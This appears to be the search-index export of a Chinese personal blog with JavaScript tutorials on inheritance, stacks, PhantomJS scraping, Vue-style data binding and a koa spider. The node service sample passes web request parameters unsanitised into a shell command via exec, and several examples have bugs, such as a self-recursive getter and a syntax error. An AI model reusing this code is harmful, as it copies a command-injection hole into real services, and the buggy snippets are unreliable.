//可以看出子类实例对象1 2都拥有了new SuperType()的成员,包括其 实例方法以及原型方法 console.log(subObj1); console.log(subObj2); //但存在一个问题,倘若修改子类实例对象1的colors会影响到实例对象2,这也就是为什么很少单独使用原型链式继承的原因,就和为什么很少使用单独使用原型模式创建对象一样. subObj1.colors.push(&apos;white&apos;);//改变subObj1的colors console.log(subObj2.colors);//影响到了subObj2的colors 组合式继承(原型链+构造函数)就像解决原型模式一样,利用构造函数.在子类构造函数中调用超类的构造函数,就可以使得子类实例对象拥有自己的成员从而屏蔽原型对象中的对应成员. function SuperType(){ this.colors=[&apos;red&apos;,&apos;blue&apos;,&apos;black&apos;];//超类实例成员 } SuperType.prototype.sayHello=function(){ console.log(&apos;hello&apos;); };//超类原型成员 function SubType(){ SuperType.call(this);//调用超类的构造方法子类实例对象拥有了自己的colors 屏蔽了原型的colors this.sex=&quot;male&quot;;//子类实例成员; } SubType.prototype=new SuperType()//继承 SubType.prototype.constructor=SubType;//保持闭三角关系 var subObj1=new SubType();//子类实例对象1 var subObj2=new SubType();//子类实例对象2 //到此为止,我们就完成了一个经典的原型链式继承 //可以看出子类实例对象1 2都拥有了new SuperType()的成员,包括其 实例方法以及原型方法 //但是此处相较于17而言,子类构造函数中调用了超类的构造函数,子类实例对象于是拥有了自己的colors,屏蔽掉了new SuperType中的colors console.log(subObj1); console.log(subObj2); subObj1.colors.push(&apos;white&apos;);//改变subObj1的colors console.log(subObj1.colors);//影响到了subObj1的colors console.log(subObj2.colors);//并未影响到subObj2的colors","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"栈——JavaScript实现","date":"2017-08-02T06:16:48.000Z","path":"2017/08/02/数据结构-栈/","text":"栈结构目的: 使用JavaSript实现栈这种数据结构定义: 特殊的列表，栈内的元素只能通过列表的一端访问，栈顶 后入先出(LIFO,last-in-first-out)的数据结构 需要实现的方法: 入栈 push 出栈 pop 清空栈 clear 栈内元素总量查找 getLength 查找 pick 实现代码如下123456789101112131415161718192021222324252627282930313233343536373839function Stack() &#123; this.dataStore = []; this.top = 0;&#125;Stack.prototype.push = function (element) &#123; // 入栈 this.dataStore[this.top] = element; this.top = this.top + 1;&#125;Stack.prototype.pop = function () &#123; // 出栈 this.top = this.top - 1; return this.dataStore[this.top];&#125;Stack.prototype.pick = function () &#123; // 查找 return this.dataStore[this.top - 1];&#125;Stack.prototype.clear = function () &#123; //清空栈 this.top = 0;&#125;Stack.prototype.getLength = function () &#123; return this.top;&#125;// s就是我们的栈 我们操作对象是s 不是s的dataStore,切记var s = new Stack();s.push(\"Tencent\");s.push('Ali');s.push(\"Baidu\");console.log(s.pick()); // Baiduconsole.log(s.pop()); // Baiduconsole.log(s.pick()); // Ali 应用 回文数的判断 回文就是指一个单词，数组，短语，从前往后从后往前都是一样的 12321.abcba 回文最简单的思路就是:把元素反转后如果与原始的元素相等，那么就意味着这就是一个回文了 这里可以用到这个栈类来操作 12345678910111213141516171819202122232425// 定义栈var Stack = require('./stack.js');function isPalindrome(str) &#123; var s = new Stack(); for (var i = 0; i &lt; str.length; i++) &#123; s.push(str[i]); &#125; var newStr = \"\"; for (var j = 0; j &lt; str.length; j++) &#123; newStr += s.pop(); &#125; if (str === newStr) &#123; return true; &#125; else &#123; return false; &#125;&#125;console.log(isPalindrome(\"112211\")); 看看这个isPalindrome函数，其实就是通过调用Stack类，然后把传递进来的str这个元素给分解后的每一个组成单元给压入到栈了 根据栈的原理，后入先出的原则，通过pop的方法在反组装这个元素，最后比较下之前与组装后的，如果相等就是回文了 你要是用reverse也可以… 将数字转换为二进制和八进制 12345678910111213141516171819var Stack = require('./stack.js');var numConvert = function (num, base) &#123; var stack = new Stack(); let converted = ''; while(num &gt; 0) &#123; stack.push(num % base); num = Math.floor(num / base); &#125; while(stack.getLength() &gt; 0) &#123; converted += stack.pop(); &#125; return converted;&#125;console.log(numConvert(10, 2)); // 1010","tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://yoursite.com/tags/数据结构/"}]},{"title":"phantomjs入门","date":"2017-07-27T03:20:22.000Z","path":"2017/07/27/phantomjs入门/","text":"PhantomJS 简介及使用 用途 网页自动控制 网络监控 获取网页截图 无头测试 webpage模块 open() open方法用于打开具体的网页。 123456var page = require('webpage').create();page.open('http://slashdot.org', function (s) &#123; console.log(s); phantom.exit();&#125;); 上面代码中，open()方法，用于打开具体的网页。它接受两个参数。第一个参数是网页的网址，这里打开的是著名新闻网站Slashdot，第二个参数是回调函数，网页打开后该函数将会运行，它的参数是一个表示状态的字符串，如果打开成功就是success，否则就是fail。 注意，只要接收到服务器返回的结果，PhantomJS就会报告网页打开成功，而不管服务器是否返回404或500错误。 open方法默认使用GET方法，与服务器通信，但是也可以使用其他方法。 12345678var webPage = require('webpage');var page = webPage.create();var postBody = 'user=username&amp;password=password';page.open('http://www.google.com/', 'POST', postBody, function(status) &#123; console.log('Status: ' + status); // Do other things here...&#125;); 上面代码中，使用POST方法向服务器发送数据。open方法的第二个参数用来指定HTTP方法，第三个参数用来指定该方法所要使用的数据。 open方法还允许提供配置对象，对HTTP请求进行更详细的配置。 123456789101112131415161718var webPage = require('webpage');var page = webPage.create();var settings = &#123; operation: \"POST\", encoding: \"utf8\", headers: &#123; \"Content-Type\": \"application/json\" &#125;, data: JSON.stringify(&#123; some: \"data\", another: [\"custom\", \"data\"] &#125;)&#125;;page.open('http://your.custom.api', settings, function(status) &#123; console.log('Status: ' + status); // Do other things here...&#125;); evaluate() evaluate方法用于打开网页以后，在页面中执行JavaScript代码。 123456789var page = require('webpage').create();page.open(url, function(status) &#123; var title = page.evaluate(function() &#123; return document.title; &#125;); console.log('Page title is ' + title); phantom.exit();&#125;); 网页内部的console语句，以及evaluate方法内部的console语句，默认不会显示在命令行。这时可以采用onConsoleMessage回调函数，上面的例子可以改写如下。 123456789101112var page = require('webpage').create();page.onConsoleMessage = function(msg) &#123; console.log('Page title is ' + msg);&#125;;page.open(url, function(status) &#123; page.evaluate(function() &#123; console.log(document.title); &#125;); phantom.exit();&#125;); 上面代码中，evaluate方法内部有console语句，默认不会输出在命令行。这时，可以用onConsoleMessage方法监听这个事件，进行处理。 includeJs() includeJs方法用于页面加载外部脚本，加载结束后就调用指定的回调函数。 123456789var page = require('webpage').create();page.open('http://www.sample.com', function() &#123; page.includeJs(\"http://path/to/jquery.min.js\", function() &#123; page.evaluate(function() &#123; $(\"button\").click(); &#125;); phantom.exit() &#125;);&#125;); 上面的例子在页面中注入jQuery脚本，然后点击所有的按钮。需要注意的是，由于是异步加载，所以phantom.exit()语句要放在page.includeJs()方法的回调函数之中，否则页面会过早退出。 render() render方法用于将网页保存成图片，参数就是指定的文件名。该方法根据后缀名，将网页保存成不同的格式，目前支持PNG、GIF、JPEG和PDF。 12345678var webPage = require('webpage');var page = webPage.create();page.viewportSize = &#123; width: 1920, height: 1080 &#125;;page.open(\"http://www.google.com\", function start(status) &#123; page.render('google_home.jpeg', &#123;format: 'jpeg', quality: '100'&#125;); phantom.exit();&#125;); 该方法还可以接受一个配置对象，format字段用于指定图片格式，quality字段用于指定图片质量，最小为0，最大为100。 system模块system模块可以加载操作系统变量，system.args就是参数数组。 123456789101112131415161718192021var page = require('webpage').create(), system = require('system'), t, address;// 如果命令行没有给出网址if (system.args.length === 1) &#123; console.log('Usage: page.js &lt;some URL&gt;'); phantom.exit();&#125;t = Date.now();address = system.args[1];page.open(address, function (status) &#123; if (status !== 'success') &#123; console.log('FAIL to load the address'); &#125; else &#123; t = Date.now() - t; console.log('Loading time ' + t + ' ms'); &#125; phantom.exit();&#125;); 使用方法如下： $ phantomjs page.js http://www.google.com 应用 加载网页 page.js 通过创建一个 webpage 对象，可以加载、分析和渲染网页。 12345678910// 创建 page 对象var page = require('webpage').create();// 打开特定的网页，抓取当前网页截图到本地page.open('http://example.com', function(status) &#123; console.log(\"Status: \" + status); if(status === \"success\") &#123; page.render('example.png'); &#125; phantom.exit();&#125;); 测试加载速度 loadspeed.js 12345678910111213141516171819202122// address 不能少了 http 协议var page = require('webpage').create(), address = 'http://www.google.com', t, address;t = Date.now();page.open(address, function(status) &#123; if (status !== 'success') &#123; console.log('FAIL to load the address'); &#125; else &#123; t = Date.now() - t; console.log('Loading ' + address); console.log('Loading time ' + t + ' msec'); &#125; phantom.exit();&#125;);运行 phantomjs loadspeed.js 即可看到如下内容Loading http://www.google.comLoading time 99 msec 获取网页内容 在打开一个网页后，我们往往有对其进行操作的需求，例如模拟点击登陆按钮、获取某个DOM元素等等，也就是需要在页面中执行javascript代码，这时候我们就需要使用到evaluate()方法。 由于因为evaluate()方法相当于一个沙盒，在其中是无法访问evaluate()之外的变量的，比如console.log就无法在evaluate中使用。 那如何将我想要获取的dom元素的id传进evaluate呢？从PhantomJS 1.6开始，我们可以将外部变量以如下的方式传给evaluate内部，需要注意的是，能传入evaluate方法内部的参数只能是简单的基本类型，例如数值、字符串、json对象等能被JSON序列化的类型，而无法接受更复杂的对象，它的返回值也同样如此。 12345678910page.open('https://item.taobao.com/item.htm?id=520115087331', function(status) &#123; var domId = \"J_SellCounter\" var sellCounter = page.evaluate(function(id) &#123; return document.getElementById(id).innerText; &#125;, domId); console.log(sellCounter); phantom.exit();&#125;); 由于open()方法打开的网页内部的console语句，和evaluate()方法中的console语句都不会执行，给我们开发调试带来了不便。这时可以采用onConsoleMessage回调函数，来打印出上面两种情况中的console语句中的信息： 123456789101112131415161718192021var webPage = require('webpage');var page = webPage.create();page.onConsoleMessage = function(msg, lineNum, sourceId) &#123; console.log('CONSOLE: ' + msg + ' (from line #' + lineNum + ' in \"' + sourceId + '\")');&#125;;其中msg是需要打印的信息，lineNum和sourceId是console.log在文件中的行号以及这个文件对应的标识id。var page = require('webpage').create();// 获取网页控制台的 console.log() 内容page.onConsoleMessage = function(msg) &#123; console.log('Page console is ' + msg);&#125;;page.open('https://www.zhihu.com/', function(status) &#123; var title = page.evaluate(function() &#123; return document.title; &#125;); console.log('Page title is ' + title); phantom.exit();&#125;); 网络请求和响应 12345678910var page = require('webpage').create();// 打印请求page.onResourceRequested = function(request) &#123; console.log('Request ' + JSON.stringify(request, undefined, 4));&#125;;// 打印响应page.onResourceReceived = function(response) &#123; console.log('Receive ' + JSON.stringify(response, undefined, 4));&#125;;page.open('https://www.baidu.com/'); 任务要求编写一个task.js脚本，参考官网的includeJs方法，实现根据传入的参数（关键字），抓取百度第一页对应该关键字的搜索结果。 踩坑记录 控制台输出中文乱码 文件开头添加 phantom.outputEncoding = ‘gbk’ evaluate()方法中console报错 dom操作没有在evaluate中进行 参数为中文是需要encodeURI一下","tags":[{"name":"phantomjs","slug":"phantomjs","permalink":"http://yoursite.com/tags/phantomjs/"}]},{"title":"记一次使用node+phantomjs+mongodb的任务","date":"2017-07-27T03:19:50.000Z","path":"2017/07/27/记一次使用node+phantomjs+mongodb的任务/","text":"网页抓取分析服务系列之三（服务封装）任务目的 学习NodeJS HTTP模块 学习NodeJS和本地进程的互动 学习NodeJS和mongodb的交互 任务描述 安装nodejs和mongodb 利用nodejs的HTTP模块封装一个node服务，监听8000端口，接受一个参数（关键字），http模块示例参考如下： var http = require(\"http\"); http.createServer(function(request, response) { console.log('request received'); response.writeHead(200, {\"Content-Type\": \"text/plain\"}); response.write(\"Hello World\"); response.end(); }).listen(8000); console.log('server started'); 收到请求后，启动phantomjs进程执行taskjs，并将接受到的参数传递给phantomjs phantomjs执行完后告诉node服务，并传回抓取的json结果 node服务将结果存到mongodb中（使用mogoose） 任务注意事项 参考nodejs和mongodb的相关文档快速学习和实践 总结相较于任务二，这次的任务综合性比较强，但是都是入门级的，譬如node,mongodb,phantomjs，都是api前两页的内容。前两次任务都是phantomjs简单入门，还好，翻翻文档就能过去，这次工具一多，杂了！ 思路很简单： 用node起一个http server，就访问localhost通过get方法在地址栏传关键字和设备名城区过去，因为http和url模块解析url太麻烦，所以使用了express，比较方便就可以取出参数。 使用child_process模块的exec方法，拼接命令行启动phantomjs，让phantomjs去爬，爬完了将数据返回node 将返回的数据存入数据库 很清晰！很简洁！很明了！对不对，尼玛我以为最大的坑在数据库(接触的太少了)，结果发现坑在node和phantomjs啊！！！！ 遇到的问题 用phantomjs爬虫的时候最开始用的原生js操作dom,后来发现当改变设备的时候dom树也变了，就不能愉快的爬虫了。这时候发现可以用page.includeJs函数引入外部js，当然就要用jquery啦，我的jquery锋利锋利最锋利。然而includeJs的回调函数一直不执行，，原来这是一个异步操作，如果你在外面写了一个phantomjs.exit(),那你的jq还在加载的时候尚未进入回调操作dom，就直接运行到后面退出了phantomjs，所以phantomjs.exit()应当写在includejs回调函数内部。 includeJs() includeJs方法用于页面加载外部脚本，加载结束后就调用指定的回调函数。 123456789var page = require('webpage').create();page.open('http://www.sample.com', function() &#123; page.includeJs(\"http://path/to/jquery.min.js\", function() &#123; page.evaluate(function() &#123; $(\"button\").click(); &#125;); phantom.exit() &#125;);&#125;); 上面的例子在页面中注入jQuery脚本，然后点击所有的按钮。需要注意的是，由于是异步加载，所以phantom.exit()语句要放在page.includeJs()方法的回调函数之中，否则页面会过早退出。 前面我们说了，当phantomjs爬虫爬完后，我们log一下整理好的json字符串，就可以被node的exec的回调函数获取(stdout)，然后就可以愉快的parse一下通过mongoose存入数据库啦，但是发现parse一直报错，说这个不是一个合法的json文件，然后就log了一下stdout，发现第一行是includeJs的log信息，就是jquery成功载入啦！然后我们的json字符串就没有那么的”json”了，试了很多方法，截取、正则替换、不知道为啥就是不能取出后半部分的json，发现stdout是个标准输出流，又去各种搜索，始终没有找到一个较好的处理stdout的方法，主要是我Node水平太差了，没有系统学习过，唉。后面不得已删除了includeJs，乖乖用原生js。 123456789var exec = require('child_process').exec;var cmdStr = 'phantomjs task.js ';exec(cmdStr + queryObj.word + ' ' + queryObj.device, function(err, stdout, stderr)&#123; if(err) &#123; console.error(`exec error: $&#123;error&#125;`); &#125; else &#123; // todo &#125;&#125;) 收获 了解到node不仅仅是用库，那些基础概念需要深入了解。 学习了mongodb的安装，启动以及mongoose的初步使用，知道了如何插入数据。初步理解了schema/model的概念。 原来一直觉得用工具没有竞争力，现在突然觉得能把各种工具有机的结合在一起发挥生产力也是非常优秀的能力。","tags":[{"name":"node","slug":"node","permalink":"http://yoursite.com/tags/node/"},{"name":"phantomjs","slug":"phantomjs","permalink":"http://yoursite.com/tags/phantomjs/"},{"name":"mongodb","slug":"mongodb","permalink":"http://yoursite.com/tags/mongodb/"}]},{"title":"双向数据绑定-检测一个对象的变化（二）","date":"2017-07-24T02:38:56.000Z","path":"2017/07/24/双向数据绑定-检测一个对象的变化（二）/","text":"前言昨天学习了通过Object.defineProperty()对象属性绑定getter与setter，从而检测对象属性的变化，但是我们并不仅仅满足于检测到变化，我们还要做出行为(回调)，即实现vue中的watch这个api,由此，引出了发布-订阅模式，每一次属性变化发生时(发布)，都会执行对应的函数(订阅)，这两天也看了不少的相关文章，记录一二。 以下概念部分转自博客园:龙恩0707的博客，本人略微有所改动，代码部分参考了vue源码学习之发布订阅实现$watch,但是我感觉原博的代码好像有一点问题，自己改了些许。 什么是发布订阅模式？定义它定义了对象间的一种一对多的关系，让多个观察者对象同时监听某一个主题对象，当一个对象发生改变时，所有依赖于它的对象都将得到通知。 现实中的发布订阅模式比如小红最近在淘宝网上看上一双鞋子，但是呢 联系到卖家后，才发现这双鞋卖光了，但是小红对这双鞋又非常喜欢，所以呢联系卖家，问卖家什么时候有货，卖家告诉她，要等一个星期后才有货，卖家告诉小红，要是你喜欢的话，你可以收藏我们的店铺，等有货的时候再通知你，所以小红收藏了此店铺，但与此同时，小明，小花等也喜欢这双鞋，也收藏了该店铺；等来货的时候就依次会通知他们； 在上面的故事中，可以看出是一个典型的发布订阅模式，卖家是属于发布者，小红，小明等属于订阅者，订阅该店铺，卖家作为发布者，当鞋子到了的时候，会依次通知小明，小红等，依次使用旺旺等工具给他们发布消息。 发布订阅模式的优点 支持简单的广播通信，当对象状态发生改变时，会自动通知已经订阅过的对象。比如上面的列子，小明，小红不需要天天逛淘宝网看鞋子到了没有，在合适的时间点，发布者(卖家)来货了的时候，会通知该订阅者(小红，小明等人)。 发布者与订阅者耦合性降低，发布者只管发布一条消息出去，它不关心这条消息如何被订阅者使用，同时，订阅者只监听发布者的事件名，只要发布者的事件名不变，它不管发布者如何改变；同理卖家（发布者）它只需要将鞋子来货的这件事告诉订阅者(买家)，他不管买家到底买还是不买，还是买其他卖家的。只要鞋子到货了就通知订阅者即可。 对于第一点，我们日常工作中也经常使用到，比如我们的ajax请求，请求有成功(success)和失败(error)的回调函数，我们可以订阅ajax的success和error事件。我们并不关心对象在异步运行的状态，我们只关心success的时候或者error的时候我们要做点我们自己的事情就可以了~ 发布订阅模式的缺点：创建订阅者需要消耗一定的时间和内存。虽然可以弱化对象之间的联系，如果过度使用的话，反而使代码不好理解及代码不好维护等等。 如何实现发布订阅模式？ 首先要想好谁是发布者(比如上面的卖家，比如setter)。 然后给发布者添加一个缓存列表(eventBus)，用于存放回调函数来通知订阅者(比如上面的买家收藏了卖家的店铺，卖家通过收藏了该店铺的一个列表名单)。 最后就是发布消息，发布者遍历这个缓存列表，依次触发里面存放的订阅者回调函数。 目标如下：1234567891011let app1 = new Observer(&#123; name: 'youngwind', age: 25 &#125;); // 你需要实现 $watch 这个 API app1.$watch('age', function(age) &#123; console.log(`我的年纪变了，现在已经是：$&#123;age&#125;岁了`) &#125;); app1.data.age = 100; // 输出：'我的年纪变了，现在已经是100岁了'先把之前的代码略作改动，类改成Vue,实例改成vm12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152class Vue &#123; //构造函数 constructor(data) &#123; this.data = data; this.walk(this.data); &#125;//类的方法(原型方法) walk(data) &#123; let val; for (let key in data) &#123; //hasOwnProperty过滤属性，判断属性是不是对象自身属性而非对象原型属性 if (data.hasOwnProperty(key)) &#123; val = data[key]; //如果属性还是一个对象，进行递归 if(Object.prototype.toString.call(val) === '[object Object]')&#123; new Vue(val); &#125; //为每一个属性添加getter以及setter this.convert(key, val); &#125; &#125; &#125; convert(key, val) &#123; Object.defineProperty(this.data, key, &#123; enumerable: true, configurable: true, get()&#123; console.log('你访问了' + key); return val; &#125;, set(newVal)&#123; console.log('你设置了' + key); console.log('新的' + key + '=' + newVal); if (newVal === val)return; if(Object.prototype.toString.call(newVal) === '[object Object]')&#123; new Vue(newVal);//如果新设置的值是对象，则需要递归 &#125; val = newVal; &#125; &#125;) &#125;&#125;let data = &#123; user: &#123; name: \"zac\", age: \"20\" &#125;, address: &#123; city: \"wh\" &#125;&#125;;let vm = new Vue(data); 思路： 发布订阅模式实现一个观察者； 将观察者挂在app上； 先给Vue的原型加上$watch这个api123456class Vue&#123; ... $watch(key,callback)&#123; &#125;&#125;定义Events(订阅者) Event.js123456789101112131415161718192021222324252627282930 export default class Events&#123; constructor()&#123; this.events=&#123;&#125;//键:检测的属性名 值:当对应的属性发生变化时应作出的相应操作，即相应的函数，可能有多个（不止一个订阅）,所以类型为数组。 &#125; on(prop,callback)&#123; //订阅操作 $watch内部进行 if(!this.events[prop])&#123; this.events[prop]=[];//回调函数数组 &#125; this.events[prop].push(callback); return this; &#125; remove(prop)&#123; for (var key in this.events) &#123; if (this.events.hasOwnProperty(key) &amp;&amp; key === prop) &#123; delete this.events[prop]; &#125; &#125; &#125; emit(prop,val,newVal)&#123; //通知遍历并执行对应属性的回调函数数组 if (!this.events[prop]) &#123; //判断是否订阅过如果没有订阅该属性，返回 return this; &#125; var args = Array.prototype.slice.call(arguments, 1);//取出参数 此处为val newVal for (let i = 0; i &lt; this.events[prop].length; i++) &#123;//执行属性对应的回调函数（数组） this.events[prop][i].apply(this, args)//将可能用到的值传入 &#125; return this; &#125;&#125;再来看main.js12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import Events from './Events'class Vue &#123; //构造函数 constructor(data) &#123; this.data = data; this.walk(this.data); &#125; //类的方法(原型方法) walk(data) &#123; let val; for (let key in data) &#123; //hasOwnProperty过滤属性，判断属性是不是对象自身属性而非对象原型属性 if (data.hasOwnProperty(key)) &#123; val = data[key]; //如果属性还是一个对象，进行递归 if(Object.prototype.toString.call(val) === '[object Object]')&#123; new Vue(val); &#125; //为每一个属性添加getter以及setter this.convert(key, val); &#125; &#125; &#125; convert(key, val) &#123; let that = this; Object.defineProperty(this.data, key, &#123; enumerable: true, configurable: true, get()&#123; console.log('你访问了' + key); return val; &#125;, set(newVal)&#123; console.log('你设置了' + key); console.log('新的' + key + '=' + newVal); if (newVal === val)return; if(Object.prototype.toString.call(newVal) === '[object Object]')&#123; new Vue(newVal);//如果新设置的值是对象，则需要递归 &#125; val = newVal; that.eventsBus.emit(key,val,newVal);//发布 &#125; &#125;) &#125; $watch(key,callback)&#123; this.eventsBus.on(key, callback);//订阅 &#125;&#125;Vue.prototype.eventsBus=new Events();//所有的Vue实例共享这一个eventsBus，这一步很重要，倘若每一个对象或子对象都有自己的eventsBus，则可能在父对象上eventsBus.on，却在子对象eventsBus.emit，回调函数此时在父对象的eventsBus属性内，无法触发。表达可能有点混乱，见谅let data = &#123; user: &#123; name: \"zac\", age: \"20\" &#125;, address: &#123; city: \"wh\" &#125;&#125;;let vm = new Vue(data);vm.$watch('age', function(val,newVal) &#123; console.log(`我的年纪变了，现在已经是：$&#123;newVal&#125;岁了`)&#125;);vm.data.user.age = 100; // 输出:你设置了 age，新的值为100 我的年纪变了，现在已经是：100岁了","tags":[{"name":"vue","slug":"vue","permalink":"http://yoursite.com/tags/vue/"}]},{"title":"koa-spider","date":"2017-07-21T08:30:16.000Z","path":"2017/07/21/koa-spider/","text":"koa-spider github地址 简述通过koa2搭建服务器。定时爬取github获取星数最多的前九名信息存入本地json文件。当服务器接受请求时返回json. 使用方法克隆项目至本地后进入项目根目录 npm install//安装依赖 cd spider node index.js //启动爬虫 cd.. node app.js//启动服务器 在浏览器访问&quot;local:3000/github/star/java&quot; 语言选项：[&apos;javascript&apos;, &apos;html&apos;, &apos;css&apos;, &apos;java&apos;, &apos;python&apos;, &apos;php&apos;, &apos;ruby&apos;, &apos;typescript&apos;, &apos;coffeescript&apos;] 依赖的库 koa koa-router搭建服务器 request/request-promise，使用async/await+promise控制异步流程更为方便 cheerio服务端jquery，进行Dom解析 node-schedule控制爬虫定时爬取的一个库 mkdirp创建存放json的文件夹 koa2-cors跨域处理 返回数据展示localhost:3000/github/star/python { &quot;data&quot;: [ { &quot;name&quot;: &quot;tensorflowtensorflow&quot;, &quot;star&quot;: &quot;64.2k&quot;, &quot;des&quot;: &quot;Computation using data flow graphs for scalable machine learning&quot;, &quot;update&quot;: &quot;Jul 21, 2017&quot; }, { &quot;name&quot;: &quot;robbyrusselloh-my-zsh&quot;, &quot;star&quot;: &quot;56.4k&quot;, &quot;des&quot;: &quot;A delightful community-driven (with 1,000+ contributors) framework for managing your zsh configuration. Includes 200+…&quot;, &quot;update&quot;: &quot;Jul 20, 2017&quot; }, { &quot;name&quot;: &quot;vintaawesome-python&quot;, &quot;star&quot;: &quot;36.3k&quot;, &quot;des&quot;: &quot;A curated list of awesome Python frameworks, libraries, software and resources&quot;, &quot;update&quot;: &quot;Jul 19, 2017&quot; }, { &quot;name&quot;: &quot;jakubroztocilhttpie&quot;, &quot;star&quot;: &quot;30.5k&quot;, &quot;des&quot;: &quot;Modern command line HTTP client – user-friendly curl alternative with intuitive UI, JSON support, syntax highlighting…&quot;, &quot;update&quot;: &quot;Jul 20, 2017&quot; }, { &quot;name&quot;: &quot;nvbnthefuck&quot;, &quot;star&quot;: &quot;29.1k&quot;, &quot;des&quot;: &quot;Magnificent app which corrects your previous console command.&quot;, &quot;update&quot;: &quot;Jul 18, 2017&quot; }, { &quot;name&quot;: &quot;palletsflask&quot;, &quot;star&quot;: &quot;28.4k&quot;, &quot;des&quot;: &quot;A microframework based on Werkzeug, Jinja2 and good intentions&quot;, &quot;update&quot;: &quot;Jul 20, 2017&quot; }, { &quot;name&quot;: &quot;blueimpjQuery-File-Upload&quot;, &quot;star&quot;: &quot;27.1k&quot;, &quot;des&quot;: &quot;File Upload widget with multiple file selection, drag&amp;drop support, progress bar, validation and preview images, audi…&quot;, &quot;update&quot;: &quot;Jul 19, 2017&quot; }, { &quot;name&quot;: &quot;djangodjango&quot;, &quot;star&quot;: &quot;27k&quot;, &quot;des&quot;: &quot;The Web framework for perfectionists with deadlines.&quot;, &quot;update&quot;: &quot;Jul 21, 2017&quot; }, { &quot;name&quot;: &quot;requestsrequests&quot;, &quot;star&quot;: &quot;26.3k&quot;, &quot;des&quot;: &quot;Python HTTP Requests for Humans™ ✨🍰✨&quot;, &quot;update&quot;: &quot;Jul 20, 2017&quot; }, { &quot;name&quot;: &quot;ansibleansible&quot;, &quot;star&quot;: &quot;24.3k&quot;, &quot;des&quot;: &quot;Ansible is a radically simple IT automation platform that makes your applications and systems easier to deploy. Avoid…&quot;, &quot;update&quot;: &quot;Jul 21, 2017&quot; } ] }","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"},{"name":"node","slug":"node","permalink":"http://yoursite.com/tags/node/"}]},{"title":"双向数据绑定-检测一个对象的变化（一）","date":"2017-07-20T03:03:34.000Z","path":"2017/07/20/双向数据绑定-检测一个对象的变化/","text":"其实这一类文章在网上已经有许多人写过了，最近在做百度前端技术学院的题目，资料很丰富，于是便总结一下前人的文章，拓展以及巩固自己的知识，如总结有所不到位的地方不正请指出！ 参考资料 vue早期源码学习系列之一：如何监听一个对象的变化 JavaScript实现MVVM之我就是想监测一个普通对象的变化 核心：Object.defineProperty() 这个方法是做什么的？ 参考资料： mdn文档 理解Object.defineProperty的作用 解析 神奇的 Object.defineProperty 语法：1Object.defineProperty(obj, prop, descriptor)此方法接受三个参数： obj:目标对象 prop:需要定义的目标对象的属性 descriptor:目标属性所拥有的特性，可以理解为属性的属性… 举个栗子：12345let obj = &#123;&#125;Object.defineProperty(obj,'b',&#123; value=123;&#125;)console.log(obj.b);//123可以知道，我们接下来都是在descriptor（get与set）上做文章。 来看看descriptor可以定义属性的那些特性： configurable如果且仅当此属性(prop)描述符的类型（writable, configurable, enumerable）可能被更改并且该属性可能从相应的对象中删除，则为true。默认为false。即起到两个作用：1.目标属性是否能被delete删除 2.目标属性的特性能否被更改.且若第一次为false则后续设置为true也无效。 enumerable此属性是否可以被枚举（使用for…in或Object.keys()）。设置为true可以被枚举；设置为false，不能被枚举。默认为false。 value属性对应的值,可以使任意类型的值，默认为undefined writable属性的值是否可以被重写。设置为true可以被重写；设置为false，不能被重写。默认为false。 举个例子：1234567let obj = &#123;&#125;Object.defineProperty(obj,\"newKey\",&#123; configurable:true,//newKey属性可删除且特性可被修改 value:\"hello\",//newKey属性值为hello writable:false,//newKey属性值不可写 enumerable:true//newKey属性可枚举&#125;);以上四个值定义了属性的特性，想要深入的同学请翻阅红宝书或者参考资料。 我们真正的重点在descriptor的get和set（存取器），（注：当使用了getter或setter方法，不允许使用writable和value这两个属性）。 当设置或获取对象的某个属性的值的时候，可以提供getter/setter方法。 getter是一种获得属性值的方法. setter是一种设置属性值的方法。 在特性中使用get/set属性来定义对应的方法,笔者理解更像是一个回调函数，当获取值或是设置值后会触发相应方法。1234567891011121314Object.defineProperty(obj, key, &#123; enumerable: true, configurable: true, get()&#123; console.log('你访问了' + key); return obj[key];//注意要return &#125;, set(newVal)&#123; console.log('你设置了' + key); console.log('新的' + key + '=' + newVal); if (newVal === obj[key])return; obj[key] = newVal; &#125;&#125;)有了set和get就容易了，我们只需要使用Object.defineProperty()对每一个属性都设置set和get方法，每次属性值变动的时候我们就可以检测一个普通对象的变化了。 完整代码如下:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class Observer &#123; //构造函数 constructor(data) &#123; this.data = data; this.walk(data); &#125; //类的方法(原型方法) walk(obj) &#123; let val; for (let key in obj) &#123; //hasOwnProperty过滤属性，判断属性是不是对象自身属性而非对象原型属性 if (obj.hasOwnProperty(key)) &#123; val = obj[key]; //如果属性还是一个对象，进行递归 if(Object.prototype.toString.call(val) === '[object Object]')&#123; new Observer(val); &#125; //为每一个属性添加getter以及setter this.convert(key, val); &#125; &#125; &#125; convert(key, val) &#123; Object.defineProperty(this.data, key, &#123; enumerable: true, configurable: true, get()&#123; console.log('你访问了' + key); return val; &#125;, set(newVal)&#123; console.log('你设置了' + key); console.log('新的' + key + '=' + newVal); if (newVal === val)return; val = newVal; &#125; &#125;) &#125;&#125;let obj = &#123; user: &#123; name: \"zac\", age: \"20\" &#125;, address: &#123; city: \"wh\" &#125;&#125;;new Observer(obj);console.log(obj);//现在可以去控制台做有趣的事情啦建议大家把我上面列的参考资料好好看一下，我只是总结了一下，资料里面非常详细哈。 如果你喜欢这篇文章那就给我一个喜欢- -!!吧！","tags":[{"name":"vue","slug":"vue","permalink":"http://yoursite.com/tags/vue/"}]},{"title":"二叉树遍历","date":"2017-07-18T01:46:28.000Z","path":"2017/07/18/二叉树遍历/","text":"二叉树的遍历今天的题目是模拟对二叉树的遍历，大二本来就学过数据结构这一门课，先序遍历、中序遍历以及后序遍历理解起来真的不难，可是让自己写个代码实现一下还是有点问题的，譬如原来一直以为递归是必须要有返回值的，今天发现只要函数运行结束，即使没有返回值，外层函数也可以继续运行。 成果如图： 思路：1. 先对二叉树进行遍历，按照顺序将节点存入数组 2. 对数组中的节点进行样式处理（排他以及定时器） 遍历代码： 先序遍历：若二叉树为空，则空操作返回，否则先访问根结点，然后前序遍历左子树，再前序遍历右子树。 12345678function DLR(node)&#123; //先序遍历 if(node)&#123; //判断二叉树是否存在，若不存在则结束返回 nodeArr.push(node); DLR(node.children[0]); DLR(node.children[1]); &#125; &#125; 